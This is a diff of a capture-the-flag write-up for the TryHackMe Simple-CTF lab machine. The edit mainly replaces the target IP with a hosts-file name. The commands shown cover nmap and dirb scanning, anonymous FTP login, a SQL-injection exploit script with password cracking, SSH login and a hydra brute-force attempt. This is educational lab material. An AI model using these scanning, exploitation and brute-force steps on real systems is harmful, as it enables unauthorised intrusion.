@@ -21,7 +21,7 @@ In this post, we'll try to root [Simple-CTF](https://tryhackme.com/room/easyctf)
 
 # Prerequisites
 ## Kali Linux / Parrot Security OS 
-The virtual machine we'll use to source the attack vectors. These Linux disrebutions has all required tools pre-installed. Choose one of them.
+The virtual machine we'll use to source the attack vectors against the Simple-CTF machine. These Linux distribution has all required tools pre-installed. Choose one of them.
 * Kali Linux VM (based on Debian distribution) can be downloaded for both VMware and VirtualBox 
 from [Offensive-Security](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/)
 * Parrot Security VM (based on Arch distribution with different desktop flavors) can be downloaded 
@@ -38,13 +38,27 @@ $ mkdir ~/tryhackme/simple_ctf
 $ cd ~/tryhackme/simple_ctf/
 ```
 
+## Add IP to hosts file [OPTIONAL]
+For better readability and as I don't want to try and remember the target'd IP, I'll add the machine's IP to my local `/etc/hosts` file:
+
+```console
+$ sudo nano /etc/hosts
+
+127.0.0.1       localhost
+127.0.1.1       kali
+10.10.157.7     simple.ctf
+...
+```
+
+Now we can use the '**simple.ctf**' hostname instead of the IP in all the commands.
+
 
 # Scanning
 ## nmap
 We'll start by scanning all ports:
 
 ```console
-$ sudo nmap -sV -p- -T4 -O -oN nmap 10.10.157.7
+$ sudo nmap -sV -p- -T4 -O -oN nmap simple.ctf
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-09 10:41 EST
 Nmap scan report for 10.10.157.7
 Host is up (0.081s latency).
@@ -66,7 +80,7 @@ Nmap done: 1 IP address (1 host up) scanned in 193.13 seconds
 Personally, if a scan finds a listening FTP service, I ALWAYS try to login using *anonymous* user with empty paswword. Let's do that.
 
 ```console
-$ ftp 10.10.157.7
+$ ftp simple.ctf
 Name (10.10.64.49:kali): anonymous
 230 Login successful.
 Remote system type is UNIX.
@@ -90,7 +104,7 @@ Using Firefox we can check the website on port 80. It looks like a simple Apache
 We'll run a directory scan using dirb
 
 ```console
-$ dirb http://10.10.157.7  
+$ dirb http://simple.ctf  
 
 -----------------
 DIRB v2.22    
@@ -98,21 +112,21 @@ By The Dark Raver
 -----------------
 
 START_TIME: Sat Jan  9 15:29:03 2021
-URL_BASE: http://10.10.157.7/
+URL_BASE: http://simple.ctf/
 WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
 -----------------
 GENERATED WORDS: 4612                                                          
----- Scanning URL: http://10.10.157.7/ ----
-+ http://10.10.157.7/index.html (CODE:200|SIZE:11321)                                               
-+ http://10.10.157.7/robots.txt (CODE:200|SIZE:929)                                                 
-+ http://10.10.157.7/server-status (CODE:403|SIZE:299)                                             
-==> DIRECTORY: http://10.10.157.7/simple/                                                           
----- Entering directory: http://10.10.157.7/simple/ ----
-==> DIRECTORY: http://10.10.157.7/simple/admin/                                                     
-==> DIRECTORY: http://10.10.157.7/simple/assets/                                                   
-==> DIRECTORY: http://10.10.157.7/simple/doc/                                                       
-+ http://10.10.157.7/simple/index.php (CODE:200|SIZE:19833)                                         
+---- Scanning URL: http://simple.ctf/ ----
++ http://simple.ctf/index.html (CODE:200|SIZE:11321)                                               
++ http://simple.ctf/robots.txt (CODE:200|SIZE:929)                                                 
++ http://simple.ctf/server-status (CODE:403|SIZE:299)                                             
+==> DIRECTORY: http://simple.ctf/simple/                                                           
+---- Entering directory: http://simple.ctf/simple/ ----
+==> DIRECTORY: http://simple.ctf/simple/admin/                                                     
+==> DIRECTORY: http://simple.ctf/simple/assets/                                                   
+==> DIRECTORY: http://simple.ctf/simple/doc/                                                       
++ http://simple.ctf/simple/index.php (CODE:200|SIZE:19833)                                         
 ...
 ```
 
@@ -141,14 +155,14 @@ Options:
 ```
 
 OK, so our flags are:
-* `--url http://10.10.157.7/simple`
+* `--url http://simple.ctf/simple`
 * `--crack`
 * `--wordlist /usr/share/seclists/Passwords/Common-Credentials/best110.txt` 
 
 Keep in mind Seclists in not pre-installed in Kali and can be downloaded using `sudo apt install seclists`
 
 This means our full command is:
-`python 46635.py --url http://10.10.157.7/simple --crack --wordlist /usr/share/seclists/Passwords/Common-Credentials/best110.txt`. 
+`python 46635.py --url http://simple.ctf/simple --crack --wordlist /usr/share/seclists/Passwords/Common-Credentials/best110.txt`. 
 
 The script will run on a dictionary of charectes, trying to find the right one in each place by injecting a special payload. The final output consists of the salt, username, email, hashed password and clear text password:
 ```console
@@ -165,12 +179,12 @@ The script will run on a dictionary of charectes, trying to find the right one i
 Now that we have `username:password` commbination we can try to use and login to SSH (remember the FTP note? it stated the combination is the same):
 
 ```
-$ ssh mitch@10.10.157.7 -p2222                                                                                                                     130 ⨯
-The authenticity of host '[10.10.157.7]:2222 ([10.10.157.7]:2222)' can't be established.
+$ ssh mitch@simple.ctf -p2222                                                                                                                     130 ⨯
+The authenticity of host '[simple.ctf]:2222 ([simple.ctf]:2222)' can't be established.
 ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '[10.10.157.7]:2222' (ECDSA) to the list of known hosts.
-mitch@10.10.157.7's password: 
+Warning: Permanently added '[simple.ctf]:2222' (ECDSA) to the list of known hosts.
+mitch@simple.ctf's password: 
 Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)
 
  * Documentation:  https://help.ubuntu.com
@@ -263,7 +277,7 @@ Same for the */openemr-5_0_1_3* path, which was not available when I tested. Was
 
 ## hydra / brute-force
 I also tried to Brute-Force *mike*s password on SSH service using Hydra.
-`hydra -l system -P /usr/share/wordlists/rockyou.txt ssh://10.10.157.7:2222 -t 4`
+`hydra -l system -P /usr/share/wordlists/rockyou.txt ssh://simple.ctf:2222 -t 4`
 
 ## Insuffucient Scanning
 Nikto wasn't able to find the Simple CMS and sent me to a goos chase all confused.
